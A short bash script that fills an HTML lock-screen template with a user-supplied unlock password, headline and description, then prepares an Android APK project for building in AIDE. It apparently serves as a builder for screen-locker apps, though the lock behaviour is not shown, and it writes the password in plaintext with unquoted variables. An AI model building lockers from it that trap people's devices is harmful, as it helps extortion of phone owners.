#!/bin/bash

echo "📱 App Name:"
read appname

echo "🔑 Unlock Password:"
read password

echo "📝 Headline:"
read headline

echo "📃 Description:"
read desc

mkdir -p output/$appname
cp -r base_template/* output/$appname/

# Replace HTML placeholders
sed -i "s|__PASSWORD__|$password|g" output/$appname/assets/lock.html
sed -i "s|__HEADLINE__|$headline|g" output/$appname/assets/lock.html
sed -i "s|__DESCRIPTION__|$desc|g" output/$appname/assets/lock.html

echo "🖼️ Place your logo.png inside 'output/$appname/res/' before building the APK."
echo "✅ Done! Now open $appname folder in AIDE and build your APK."
